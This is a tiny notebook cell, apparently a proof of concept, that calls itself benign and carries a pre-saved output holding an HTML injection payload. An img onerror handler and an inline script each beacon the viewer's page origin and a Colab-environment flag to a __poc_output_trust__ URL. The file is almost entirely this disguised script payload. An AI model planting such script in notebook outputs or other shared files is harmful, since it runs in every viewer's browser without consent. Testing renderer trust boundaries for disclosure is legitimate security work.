# %%
print('benign-looking cell - do NOT run this; outputs are pre-saved')
# Out:
# <img src=x onerror="new Image().src='https://colab.research.google.com/__poc_output_trust__?v=imgonerror&o='+encodeURIComponent(location.origin)+'&gc='+((typeof google!=='undefined'&&google&&google.colab)?'1':'0')"><script>new Image().src='https://colab.research.google.com/__poc_output_trust__?v=htmlscript&o='+encodeURIComponent(location.origin)+'&gc='+((typeof google!=='undefined'&&google&&google.colab)?'1':'0');</script>
